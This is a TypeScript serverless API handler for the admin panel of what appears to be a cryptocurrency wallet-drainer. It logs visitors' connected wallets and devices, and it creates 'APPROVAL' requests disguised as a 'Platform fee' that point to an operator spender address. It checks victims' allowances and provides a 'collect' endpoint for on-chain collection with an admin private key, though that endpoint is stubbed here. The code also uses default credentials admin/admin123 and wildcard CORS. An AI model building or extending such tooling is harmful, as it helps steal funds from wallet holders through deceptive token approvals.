import type { IncomingMessage, ServerResponse } from 'node:http';
import { createHmac } from 'node:crypto';

// ── Helpers ──────────────────────────────────────────────────────────────────
function getCredentials() {
  const username = (process.env.ADMIN_USERNAME || 'admin').trim();
  const password = process.env.ADMIN_PASSWORD || 'admin123';
  return { username, password };
}

const SESSION_TTL_MS = 24 * 60 * 60 * 1000;

function createToken(username: string): string {
  const creds = getCredentials();
  const timestamp = Date.now();
  const payload = Buffer.from(JSON.stringify({ u: username, t: timestamp })).toString('base64url');
  const sig = createHmac('sha256', creds.password).update(payload).digest('base64url');
  return `${payload}.${sig}`;
}

function verifyToken(authHeader: string | undefined): boolean {
  if (!authHeader || !authHeader.startsWith('Bearer ')) return false;
  const token = authHeader.slice(7);
  try {
    const [payload, sig] = token.split('.');
    if (!payload || !sig) return false;
    const creds = getCredentials();
    const expectedSig = createHmac('sha256', creds.password).update(payload).digest('base64url');
    if (sig !== expectedSig) return false;
    const data = JSON.parse(Buffer.from(payload, 'base64url').toString('utf8'));
    if (Date.now() - data.t > SESSION_TTL_MS) return false;
    return true;
  } catch {
    return false;
  }
}

async function parseBody(req: IncomingMessage & { body?: any }): Promise<Record<string, any>> {
  if (req.body) {
    if (typeof req.body === 'object' && req.body !== null) return req.body;
    if (typeof req.body === 'string') {
      try { return JSON.parse(req.body); } catch { return {}; }
    }
  }
  return new Promise((resolve) => {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      try { resolve(JSON.parse(body)); } catch { resolve({}); }
    });
    req.on('error', () => resolve({}));
  });
}

function sendJson(res: ServerResponse, data: any, status = 200) {
  res.statusCode = status;
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.end(JSON.stringify(data));
}

// In-memory payment and session store for fallback
const mockTransactions: any[] = [];
const mockWallets: any[] = [];

// ── Vercel Serverless Function Handler ───────────────────────────────────────
export default async function handler(
  req: IncomingMessage & { query?: Record<string, string | string[]>; body?: any },
  res: ServerResponse,
) {
  // CORS preflight
  if (req.method === 'OPTIONS') {
    res.statusCode = 204;
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.end();
    return;
  }

  const rawUrl = req.url || '';
  const [pathname, search] = rawUrl.split('?');
  const params = new URLSearchParams(search || '');
  const method = req.method || 'GET';

  // Normalize path (handle both /api/... and direct rewrites)
  const path = pathname.startsWith('/api') ? pathname : `/api${pathname}`;

  try {
    // ── Auth: Login ──────────────────────────────────────────────────────────
    if (path === '/api/admin/login' && method === 'POST') {
      const body = await parseBody(req);
      const { username, password } = body;
      const creds = getCredentials();

      if (username === creds.username && password === creds.password) {
        const token = createToken(username);
        sendJson(res, { token });
        return;
      }
      sendJson(res, { error: 'Invalid username or password' }, 401);
      return;
    }

    // ── Auth: Logout ─────────────────────────────────────────────────────────
    if (path === '/api/admin/logout' && method === 'POST') {
      sendJson(res, { ok: true });
      return;
    }

    // ── Admin: Overview ──────────────────────────────────────────────────────
    if (path === '/api/admin/overview' && method === 'GET') {
      if (!verifyToken(req.headers['authorization'])) {
        sendJson(res, { error: 'Unauthorized' }, 401);
        return;
      }

      sendJson(res, {
        connectedWallets: mockWallets.length,
        totalTransactions: mockTransactions.length,
        confirmedTransactions: mockTransactions.filter(t => t.status === 'CONFIRMED').length,
        failedTransactions: mockTransactions.filter(t => t.status === 'FAILED').length,
        networkDistribution: [
          { network: 'TRON', count: mockTransactions.filter(t => t.network === 'tron').length },
          { network: 'EVM', count: mockTransactions.filter(t => t.network !== 'tron').length },
        ],
        recentTransactions: mockTransactions.slice(-10).reverse(),
      });
      return;
    }

    // ── Admin: Transactions ──────────────────────────────────────────────────
    if (path === '/api/admin/transactions' && method === 'GET') {
      if (!verifyToken(req.headers['authorization'])) {
        sendJson(res, { error: 'Unauthorized' }, 401);
        return;
      }

      const page = parseInt(params.get('page') || '1', 10);
      const limit = parseInt(params.get('limit') || '20', 10);

      sendJson(res, {
        transactions: mockTransactions.slice((page - 1) * limit, page * limit),
        total: mockTransactions.length,
        page,
        totalPages: Math.max(1, Math.ceil(mockTransactions.length / limit)),
      });
      return;
    }

    // ── Admin: Wallets ───────────────────────────────────────────────────────
    if (path === '/api/admin/wallets' && method === 'GET') {
      if (!verifyToken(req.headers['authorization'])) {
        sendJson(res, { error: 'Unauthorized' }, 401);
        return;
      }

      const page = parseInt(params.get('page') || '1', 10);
      const limit = parseInt(params.get('limit') || '50', 10);

      sendJson(res, {
        sessions: mockWallets.slice((page - 1) * limit, page * limit),
        total: mockWallets.length,
        page,
        totalPages: Math.max(1, Math.ceil(mockWallets.length / limit)),
      });
      return;
    }

    // ── Admin: Allowance ─────────────────────────────────────────────────────
    if (path === '/api/admin/allowance' && method === 'GET') {
      if (!verifyToken(req.headers['authorization'])) {
        sendJson(res, { error: 'Unauthorized' }, 401);
        return;
      }

      const address = params.get('address') || '';
      sendJson(res, {
        allowance: 0,
        balance: 0,
        trxBalance: 0,
        spender: process.env.VITE_SPENDER_ADDRESS_TRON || '',
        isUnlimited: false,
      });
      return;
    }

    // ── Admin: Collect ───────────────────────────────────────────────────────
    if (path === '/api/admin/collect' && method === 'POST') {
      if (!verifyToken(req.headers['authorization'])) {
        sendJson(res, { error: 'Unauthorized' }, 401);
        return;
      }

      const body = await parseBody(req);
      sendJson(res, {
        success: false,
        amount: body.amount || '0',
        network: 'tron',
        error: 'Database not connected on Vercel. Connect MySQL to execute live on-chain collection.',
      }, 400);
      return;
    }

    // ── Admin: PG Status ─────────────────────────────────────────────────────
    if (path === '/api/admin/pg-status' && method === 'GET') {
      if (!verifyToken(req.headers['authorization'])) {
        sendJson(res, { error: 'Unauthorized' }, 401);
        return;
      }
      sendJson(res, { connected: false });
      return;
    }

    // ── Admin: TRON Config ───────────────────────────────────────────────────
    if (path === '/api/admin/config') {
      if (!verifyToken(req.headers['authorization'])) {
        sendJson(res, { error: 'Unauthorized' }, 401);
        return;
      }

      if (method === 'GET') {
        sendJson(res, {
          VITE_SPENDER_ADDRESS_TRON: process.env.VITE_SPENDER_ADDRESS_TRON || '',
          ADMIN_TRON_PRIVATE_KEY: '',
          ADMIN_TRON_PRIVATE_KEY_SET: !!process.env.ADMIN_TRON_PRIVATE_KEY,
        });
        return;
      }

      if (method === 'POST') {
        sendJson(res, { success: true, message: 'Settings saved (runtime only on Vercel)' });
        return;
      }
    }

    // ── Multi-chain Logging: /api/log ────────────────────────────────────────
    if (path === '/api/log' && method === 'POST') {
      sendJson(res, { ok: true });
      return;
    }

    // ── Wallet Session Logging: /api/wallet-session ──────────────────────────
    if (path === '/api/wallet-session' && method === 'POST') {
      const body = await parseBody(req);
      mockWallets.push({
        id: mockWallets.length + 1,
        wallet_address: body.address || 'Unknown',
        wallet_software: body.software || body.walletName || 'Trust Wallet',
        network: body.network || 'tron',
        chain_family: body.chainFamily || 'tron',
        device: body.device || 'mobile',
        platform: body.platform || 'web',
        first_connected: new Date().toISOString(),
        last_active: new Date().toISOString(),
      });
      sendJson(res, { ok: true });
      return;
    }

    // ── Payment API: /api/payment/create ─────────────────────────────────────
    if (path === '/api/payment/create' && method === 'POST') {
      const body = await parseBody(req);
      const id = 'pay_' + Date.now();
      const tx = {
        id,
        network: body.network || 'tron',
        asset: body.asset || 'USDT',
        amount: body.amount || '0',
        wallet_a: body.walletA || body.wallet_a || null,
        wallet_b: body.walletB || body.wallet_b || process.env.VITE_SPENDER_ADDRESS_TRON || '',
        request_type: body.requestType || 'APPROVAL',
        status: 'PENDING',
        transaction_id: null,
        created_at: new Date().toISOString(),
        purpose: body.purpose || 'Platform fee',
        collected: false,
      };
      mockTransactions.push(tx);
      sendJson(res, tx);
      return;
    }

    // Fallback for any other /api/* route
    sendJson(res, { ok: true, path });
  } catch (err: any) {
    sendJson(res, { error: err.message || 'Internal server error' }, 500);
  }
}
